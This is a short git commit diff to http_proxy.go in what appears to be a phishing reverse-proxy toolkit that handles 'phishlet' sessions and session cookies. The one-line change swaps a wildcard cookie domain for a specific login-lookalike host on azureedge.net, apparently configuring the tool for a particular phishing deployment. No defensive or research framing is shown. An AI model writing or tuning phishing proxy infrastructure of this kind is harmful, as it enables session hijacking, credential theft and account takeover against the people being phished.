1fb17f65478737fb43247f0739825854c2b3a2e0
Alex <alexmartirosyan@pm.me>
2024-07-30 20:50:02 -0400

    Update http_proxy.go

--- core/http_proxy.go
+++ core/http_proxy.go
@@ -894,7 +894,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
 						Value:   ps.SessionId,
 						Path:    "/",
-						Domain:  "*.azureedge.net",
+						Domain:  "xfilesrevealed-login.azureedge.net",
 						Expires: time.Now().Add(60 * time.Minute),
 					}
 				}
